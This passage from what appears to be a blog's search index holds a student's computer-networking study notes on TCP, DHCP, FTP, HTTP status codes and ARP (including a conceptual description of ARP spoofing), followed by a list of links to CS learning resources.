fragmented data, send a confirmation to the sender based on the fragment data sequence number;<br>③Timeout retransmission: The sender starts a timeout timer when sending fragments, if no corresponding confirmation is received after the timer expires, retransmit the fragment;<br>④Sliding window: The receive buffer space size of each party in a TCP connection is fixed, the receiver only allows the other end to send data that the receiver buffer can accommodate, TCP provides flow control based on sliding window to prevent faster hosts from causing buffer overflow in slower hosts;<br>⑤Out-of-order handling: TCP fragments transmitted as IP datagrams may arrive out of order, TCP will reorder the received data and deliver the received data to the application layer in the correct order;<br>⑥Duplicate handling: TCP fragments transmitted as IP datagrams will have duplicates, the TCP receiver must discard duplicate data;<br>⑦Data checksum: TCP maintains checksums of its header and data, this is an end-to-end checksum designed to detect any changes in data during transmission. If the checksum of a received fragment has errors, TCP will discard this fragment and not confirm receipt of this segment, causing the peer to timeout and retransmit.</p><h3 id="Simple-Distinction"><a href="#Simple-Distinction" class="headerlink" title="Simple Distinction"></a>Simple Distinction</h3><p>Internet transport layer has two main protocols that complement each other. The <strong>connectionless</strong> one is UDP, which does almost nothing special except providing applications with data packet sending functionality and allowing them to structure their own protocols at required levels. The <strong>connection-oriented</strong> one is TCP, which does almost everything.</p><h2 id="DHCP-Service"><a href="#DHCP-Service" class="headerlink" title="DHCP Service"></a>DHCP Service</h2><h3 id="DHCP-Introduction"><a href="#DHCP-Introduction" class="headerlink" title="DHCP Introduction"></a>DHCP Introduction</h3><p><strong>DHCP</strong> (Dynamic Host Configuration Protocol) is a local area network protocol. It refers to a server controlling a range of IP addresses, where client machines can automatically obtain server-assigned IP addresses and subnet masks when logging into the server.<br>Usually applied in large local area network environments, its main function is to centrally manage and allocate IP addresses, enabling hosts in the network environment to dynamically obtain IP addresses, Gateway addresses, DNS server addresses and other information, and improve address utilization.</p><p>DHCP protocol uses a client&#x2F;server model, where dynamic host address allocation tasks are driven by network hosts. When the DHCP server receives address application information from network hosts, it sends relevant address configuration information to network hosts to achieve dynamic configuration of network host address information.</p><h3 id="DHCP-Functions"><a href="#DHCP-Functions" class="headerlink" title="DHCP Functions"></a>DHCP Functions</h3><p>DHCP has the following functions:</p><ol><li>Ensure that any IP address can only be used by one DHCP client at the same time.</li><li>DHCP should be able to assign permanent fixed IP addresses to users.</li><li>DHCP should be able to coexist with hosts that obtain IP addresses by other methods (such as hosts with manually configured IP addresses).</li><li>DHCP servers should provide services to existing BOOTP clients.</li></ol><h3 id="Address-Allocation-Methods"><a href="#Address-Allocation-Methods" class="headerlink" title="Address Allocation Methods"></a>Address Allocation Methods</h3><p>DHCP has three mechanisms for allocating IP addresses:</p><ol><li>Automatic Allocation: DHCP server assigns a permanent IP address to the host. Once the DHCP client successfully leases an IP address from the DHCP server for the first time, it can use that address permanently.</li><li>Dynamic Allocation: DHCP server assigns a time-limited IP address to the host. When the time expires or the host explicitly abandons the address, the address can be used by other hosts.</li><li>Manual Allocation: The client’s IP address is specified by the network administrator, and the DHCP server only tells the client host the specified IP address.<br>Among the three address allocation methods, only dynamic allocation can reuse addresses that clients no longer need.</li></ol><h2 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h2><h3 id="FTP-Introduction"><a href="#FTP-Introduction" class="headerlink" title="FTP Introduction"></a>FTP Introduction</h3><p>File Transfer Protocol (FTP) is a set of standard protocols for file transfer over networks. It works at the seventh layer of the OSI model, the fourth layer of the TCP model, i.e., the application layer, using <strong>TCP transmission instead of UDP</strong>. Clients must go through a “three-way handshake” process before establishing a connection with the server, ensuring that the connection between client and server is reliable, and it’s connection-oriented, providing reliable guarantee for data transmission.<br>FTP allows users to communicate with another host through file operations (such as file addition, deletion, modification, query, transfer, etc.). However, users don’t actually log into the computer they want to access to become full users. FTP programs can be used to access remote resources, implement user round-trip file transfer, directory management, and email access, etc., even if both computers may have different operating systems and file storage methods.</p><h3 id="Transmission-Methods"><a href="#Transmission-Methods" class="headerlink" title="Transmission Methods"></a>Transmission Methods</h3><p>FTP has two transmission methods: ASCII and binary.</p><h4 id="ASCII-Transmission-Method"><a href="#ASCII-Transmission-Method" class="headerlink" title="ASCII Transmission Method"></a>ASCII Transmission Method</h4><p>Assuming the file being copied contains simple ASCII text, if the remote machine is not running UNIX, ftp usually automatically adjusts the file content during file transfer to interpret the file in the format that the other computer stores text files. But often there are cases where the file being transmitted doesn’t contain text files, they might be programs, databases, word processing files, or compressed files. Before copying any non-text files, use the binary command to tell ftp to copy character by character.</p><h4 id="Binary-Transmission-Mode"><a href="#Binary-Transmission-Mode" class="headerlink" title="Binary Transmission Mode"></a>Binary Transmission Mode</h4><p>In binary transmission, the bit order of the file is preserved so that the original and copy are bit-by-bit corresponding. Even if the file containing the bit sequence on the destination machine is meaningless. For example, Macintosh transmits executable files to Windows systems in binary mode, and this file cannot be executed on the other system. If binary files are transmitted in ASCII mode, translation will still occur even if not needed. This will corrupt data. (ASCII mode generally assumes the first significant bit of each character is meaningless because ASCII character combinations don’t use it. If transmitting binary files, all bits are important.)</p><h3 id="FTP-Supports-Two-Modes"><a href="#FTP-Supports-Two-Modes" class="headerlink" title="FTP Supports Two Modes"></a>FTP Supports Two Modes</h3><p>FTP client initiates FTP session and establishes corresponding connection with FTP server. During FTP session, two connections need to be established: control information process and data process. Control connection cannot complete data transmission tasks, only used to transmit internal commands executed by FTP and command responses and other control information; data connection is the connection for file transmission between server and client, it’s full-duplex, allowing simultaneous bidirectional data transmission. When data transmission is complete, the data connection is revoked, returning to FTP session state until the control connection is revoked and the session exits.<br>FTP supports two modes: Standard (PORT mode, active mode), Passive (PASV, passive mode).</p><h4 id="Port-Mode-Active-Mode"><a href="#Port-Mode-Active-Mode" class="headerlink" title="Port Mode (Active Mode)"></a>Port Mode (Active Mode)</h4><p>FTP client first establishes connection with server’s TCP port 21 for sending commands. When the client needs to receive data, it sends PORT command on this channel. PORT command contains which port the client uses to receive data. When transmitting data, the server connects to the client’s specified port through its own TCP port 20 to send data. FTP server must establish a new connection with the client for data transmission.</p><h4 id="Passive-Mode"><a href="#Passive-Mode" class="headerlink" title="Passive Mode"></a>Passive Mode</h4><p>Control channel establishment is similar to Standard mode, but sends Pasv command after establishing connection. After the server receives the Pasv command, it opens a temporary port (port number greater than 1023 and less than 65535) and notifies the client of the request to transmit data on this port. The client connects to this port of the FTP server, then the FTP server transmits data through this port.</p><h4 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h4><p>Many firewalls are configured to not allow external connections, so many FTP servers behind firewalls or on internal networks don’t support PASV mode because clients cannot open high ports of FTP servers through firewalls; while many internal network clients cannot use PORT mode to log into FTP servers because TCP 20 from the server cannot establish a new connection with clients on the internal network, causing it to not work.</p><h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><p>Hyper Text Transfer Protocol (HTTP) is a simple request-response protocol that usually runs on top of TCP. Request and response message headers are given in ASCII form.</p><h3 id="Application-Scenarios"><a href="#Application-Scenarios" class="headerlink" title="Application Scenarios"></a>Application Scenarios</h3><p>When HTTP was first born, it was mainly used for WEB content retrieval. At that time, content wasn’t as rich as it is now, layout wasn’t as beautiful, and user interaction scenarios were almost non-existent. For this simple scenario of retrieving web content, HTTP performed quite well. But with the development of the internet and the birth of WEB2.0, more content began to be displayed (more image files), layout became more beautiful (more CSS), and more complex interactions were introduced (more JS). The total amount of data loaded and the number of requests when users open a website homepage are also constantly increasing.</p><h3 id="Message-Format"><a href="#Message-Format" class="headerlink" title="Message Format"></a>Message Format</h3><p>HTTP messages consist of requests from client to server and responses from server to client.</p><h4 id="Request-Message"><a href="#Request-Message" class="headerlink" title="Request Message"></a>Request Message</h4><p>Request message format is as follows:</p><p>Request line - General information header - Request header - Entity header - Message body</p><p>Request line starts with method field, followed by URL field and HTTP protocol version field, ending with CRLF. SP is the separator. Except for CF and LF being required in the final CRLF sequence, others are optional. For specific content about general information headers, request headers, and entity headers, refer to related documents.</p><h4 id="Response-Message"><a href="#Response-Message" class="headerlink" title="Response Message"></a>Response Message</h4><p>Response message format is as follows:</p><p>Status line - General information header - Response header - Entity header - Message body</p><p>Status code consists of 3 digits, indicating whether the request was understood or satisfied. Reason analysis is a brief description of the original status code. Status codes are used to support automatic operations, while reason analysis is for user use. Clients don’t need to check or display syntax. For specific content about general information headers, response headers, and entity headers, refer to related documents.</p><p><strong><a href="https://blog.csdn.net/m0_45861545/article/details/120835738">Detailed HTTP Message Explanation Click Here</a></strong></p><h3 id="Status-Codes"><a href="#Status-Codes" class="headerlink" title="Status Codes"></a>Status Codes</h3><p>After the server receives an HTTP request, it sends response information to the client, placed in the first line. The most important part is the status code</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br></pre></td></tr></table></figure><h4 id="Status-Code-Types-First-Digit"><a href="#Status-Code-Types-First-Digit" class="headerlink" title="Status Code Types - First Digit"></a>Status Code Types - First Digit</h4><ul><li>1**: Request successfully received, continue processing; range 100~101</li><li>2**: Server successfully processed request; range 200~206</li><li>3**: Accessed resource was moved, inform client to resend new request; range 300~305</li><li>4**: Client error, server cannot process request, such as accessed resource doesn’t exist; range 400~415</li><li>5**: Server error; range 500~505</li></ul><h4 id="Common-HTTP-Status-Codes"><a href="#Common-HTTP-Status-Codes" class="headerlink" title="Common HTTP Status Codes"></a>Common HTTP Status Codes</h4><ul><li>200: Client request successful (common)</li><li>302: Redirect</li><li>404: Requested resource doesn’t exist (common)</li><li>400: Client request syntax error, cannot be understood by server</li><li>401: Access unauthorized</li><li>403: Server received request but refused service</li><li>500: Server internal error (common)</li><li>503: Server currently cannot process, may be able to after some time</li></ul><p>For specific details, see “<strong>Illustrated HTTP</strong>“</p><h1 id="Communication"><a href="#Communication" class="headerlink" title="Communication"></a>Communication</h1><h2 id="Internal-Network-Communication-Local-Area-Network"><a href="#Internal-Network-Communication-Local-Area-Network" class="headerlink" title="Internal Network Communication (Local Area Network)"></a>Internal Network Communication (Local Area Network)</h2><h3 id="Ethernet"><a href="#Ethernet" class="headerlink" title="Ethernet"></a>Ethernet</h3><p>Ethernet is a computer <strong>local area network</strong> technology.</p><h3 id="Internal-Network-Communication-Process"><a href="#Internal-Network-Communication-Process" class="headerlink" title="Internal Network Communication Process"></a>Internal Network Communication Process</h3><p>The internal network mentioned here generally refers to Local Area Network (LAN). When we say two terminals are in the same internal network, it essentially means the network numbers of the two terminals are the same. If two terminals are in the same internal network, their communication method is as follows</p><p><img src="https://pic3.zhimg.com/80/v2-28645c18e711eac7b6a3262f94556ecc_1440w.png" alt="image"></p><h3 id="ARP-Introduction"><a href="#ARP-Introduction" class="headerlink" title="ARP Introduction"></a>ARP Introduction</h3><h4 id="ARP-Protocol"><a href="#ARP-Protocol" class="headerlink" title="ARP Protocol"></a>ARP Protocol</h4><p>Address Resolution Protocol (ARP) is a TCP&#x2F;IP protocol for obtaining physical addresses based on IP addresses. When a host sends information, it broadcasts ARP requests containing the target IP address to all hosts on the local area network and receives return messages to determine the target’s physical address; after receiving return messages, it stores the IP address and physical address in the local ARP cache and retains them for a certain time, directly querying the <strong>ARP cache</strong> for the next request to save resources. Address Resolution Protocol is based on mutual trust between hosts in the network. Hosts on the local area network can autonomously send ARP reply messages, and other hosts will record them in the local ARP cache without detecting the authenticity of the reply messages when received; thus attackers can send fake ARP reply messages to a certain host, making the information sent unable to reach the expected host or reach the wrong host, constituting ARP spoofing. ARP commands can be used to query the correspondence between IP addresses and MAC addresses in the local ARP cache, add or delete static correspondences, etc. Related protocols include RARP and proxy ARP. NDP is used to replace Address Resolution Protocol in IPv6.</p><h4 id="ARP-Spoofing"><a href="#ARP-Spoofing" class="headerlink" title="ARP Spoofing"></a>ARP Spoofing</h4><p>ARP spoofing, also known as ARP poisoning (often translated as ARP virus on the network) or ARP attack, is an attack technique targeting the Ethernet Address Resolution Protocol (ARP). By spoofing the gateway MAC address of visitor PCs in the local area network, it makes visitor PCs mistakenly think that the attacker’s changed MAC address is the gateway’s MAC, causing network failure. This attack allows attackers to obtain data packets on the local area network and even tamper with data packets, and can make specific computers or all computers on the network unable to connect normally.</p><h4 id="Free-ARP"><a href="#Free-ARP" class="headerlink" title="Free ARP"></a>Free ARP</h4><ol><li>Check for address conflicts</li><li>Update own ARP cache</li></ol><h2 id="Internet-Communication-Process"><a href="#Internet-Communication-Process" class="headerlink" title="Internet Communication Process"></a>Internet Communication Process</h2><p>If the host is on the Internet, the target address and source address are not in the same internal network, meaning the network number parts of their IP addresses are not consistent. At this time, data packets need to be sent to the “default gateway” for routing. The specific communication process is as follows:</p><p><img src="https://pic4.zhimg.com/80/v2-5188517210eac6afb96e4046cbbe65c6_1440w.png" alt="image"></p>]]></content>
      
      
      <categories>
          
          <category> CS Study Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study </tag>
            
            <tag> Computer Networks </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>useful_links</title>
      <link href="/2022/05/25/useful-links/"/>
      <url>/2022/05/25/useful-links/</url>
      
        <content type="html"><![CDATA[<p>Book Resources: <a href="https://github.com/frankcbliu/CS-Books-PDF">https://github.com/frankcbliu/CS-Books-PDF</a></p><p>Algorithm Knowledge Explanation: <a href="https://oi-wiki.org/graph/">https://oi-wiki.org/graph/</a></p><p>CS Self-Study Guide: <a href="https://csdiy.wiki/">https://csdiy.wiki</a></p><p>XuetangX (similar to MOOC course website):</p><p><a href="https://www.xuetangx.com/">https://www.xuetangx.com</a> (Highly recommend Tsinghua University Professor Zheng Li’s C++ Programming course)</p><span id="more"></span><p>Computer Practical Technology (XuetangX):<br><a href="https://www.xuetangx.com/learn/THUSAST08091234567890/THUSAST08091234567890/8571842/video/13167559">https://www.xuetangx.com/learn/THUSAST08091234567890/THUSAST08091234567890/8571842/video/13167559</a></p><p>Data Structures by Deng Junhui (XuetangX):<br><a href="https://www.xuetangx.com/learn/THU08091000384/THU08091000384/10322765/video/17436706?channel=i.area.manual_search">https://www.xuetangx.com/learn/THU08091000384/THU08091000384/10322765/video/17436706?channel=i.area.manual_search</a></p><p>Online Code Learning Websites:</p><p><a href="https://www.freecodecamp.org/">https://www.freecodecamp.org/</a><br><a href="https://www.codecademy.com/learn">https://www.codecademy.com/learn</a></p><p>Tsinghua University Graduate Entrance Exam Materials:<br><a href="https://github.com/Wsky51/THU-CS912-kaoyan">https://github.com/Wsky51/THU-CS912-kaoyan</a></p><p>GitHub Configuration Hexo Personal Blog Setup:<br><a href="https://zhuanlan.zhihu.com/p/60578464">https://zhuanlan.zhihu.com/p/60578464</a><br><a href="https://zhuanlan.zhihu.com/p/36912355?utm_source=wechat_session&utm_medium=social&s_r=0">https://zhuanlan.zhihu.com/p/36912355?utm_source=wechat_session&amp;utm_medium=social&amp;s_r=0</a> </p><p>Tsinghua Senior OOP Notes<br><a href="https://c7w.tech/oop-note/">https://c7w.tech/oop-note/</a></p><p>Tsinghua Senior Notes:<br><a href="https://cloud.tsinghua.edu.cn/d/598bef9e3b844f17bf59/">https://cloud.tsinghua.edu.cn/d/598bef9e3b844f17bf59/</a></p><p>Linux Learning Notes:<br><a href="https://zq99299.github.io/linux-tutorial/">https://zq99299.github.io/linux-tutorial/</a></p><p>Vim Editor Configuration Plugins:</p><p>MIT Vim Lecture:<br><a href="https://missing.csail.mit.edu/2020/editors/">https://missing.csail.mit.edu/2020/editors/</a> (Contains teacher’s configuration)</p><p>Plugin Search Website:<br><a href="https://vimawesome.com/">https://vimawesome.com</a></p><p>Super Powerful Vim Configuration (vimplus) - Sequel:<br><a href="https://www.cnblogs.com/highway-9/p/5984285.html">https://www.cnblogs.com/highway-9/p/5984285.html</a></p><p>iTerm2 + zsh + oh-my-zsh Beautification:</p><p>Tutorial: <a href="https://zhuanlan.zhihu.com/p/145437836">https://zhuanlan.zhihu.com/p/145437836</a></p><p>Icons: <a href="https://www.nerdfonts.com/cheat-sheet">https://www.nerdfonts.com/cheat-sheet</a></p>]]></content>
      
      
      <categories>
          
          <category> Learning Resources </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Learning </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
